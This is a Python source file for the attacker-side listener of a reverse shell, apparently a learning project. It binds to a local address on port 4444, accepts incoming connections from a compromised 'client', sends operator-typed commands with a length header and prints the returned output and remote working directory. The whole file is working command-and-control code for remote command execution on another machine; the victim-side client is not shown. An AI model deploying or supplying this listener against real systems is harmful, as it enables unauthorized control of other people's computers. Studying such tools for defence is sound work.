import socket
import sys
import time
from termcolor import colored

# FORMAT: format that used to decode and encode
# HEADERSIZE: header size is used to determine the length of messages
FORMAT = "utf-8"
HEADERSIZE = 16


# make a header for every message(command here) that is going to be send.
# this header contain message(command) length so this way by reading header first 
# client can easily find the length of message(command)
def send_to_client(client_socket, cmd):
    header_length = len(cmd)
    header_length = str(header_length)
    header = header_length + " " * ( HEADERSIZE - len(header_length) )
    command = (header + cmd).encode(FORMAT)
    client_socket.send(command)


# function for reading what client sends. it first reads header and finds the 
# exact lenght of the messsage that is going to be received and finnaly read the message
def  recv_from_client(client_socket):
    header = client_socket.recv(HEADERSIZE).decode(FORMAT)
    if header:
        output_size = int(header.strip(" "))
        output = client_socket.recv(output_size).decode(FORMAT)
        if output != "":
            # as path and output of commands come together we need to split them out
            # so we split them out by new line(\n) get the last one that is path and join them again 
            response = output.split("\n")
            output = "\n".join(response[0:-2])
            path = response[-1]
            print(colored(output, 'magenta'))
            print(colored(path, 'cyan'), end="")
            
        
# this fuction wait for user to enter command and then send that to client and get the result and print it out
def command_handler(client_socket):
    print(colored("server#> ", 'cyan'), end="")
    while True:
        cmd = input("")
        if cmd == "":
            continue
        if cmd == "exit" or cmd == "quit":
            # if user etner exit or quit we just close the client connection
            # but server still running and can accept new connection from new clients
            break
        send_to_client(client_socket, cmd)
        recv_from_client(client_socket)

    print(colored("[!] Connection Closed", 'red'))
    client_socket.close()


def main():
    # ipv4 and port to bind
    Bind_ip = "192.168.1.104"
    Bind_port = 4444

    # create server socket using INET(ipv4) family and tcp type protocol
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # bind to specified ip and port 
        server.bind((Bind_ip, Bind_port))
    except Exception as e:
        print(colored("[!] binding server errro: " + str(e), "red"))
        server.close()
        sys.exit()
    
    server.listen()
    print(colored(f"[+] Litening on {Bind_ip}:{Bind_port}", 'yellow'))

    while True:
        try:
            # wait for incoming connection and after recieving one, give a notificaton and then run command_handler fucntion
            connected_client, addr = server.accept()
            print(colored(f"[+] Receive Connection from {addr[0]}:{addr[1]}", 'yellow'))

            command_handler(connected_client)
        except KeyboardInterrupt:
            print(colored("\n[!] Closing server", 'yellow'))
            time.sleep(1)
            connected_client.close()
            server.close()

if __name__ == "__main__":
    main()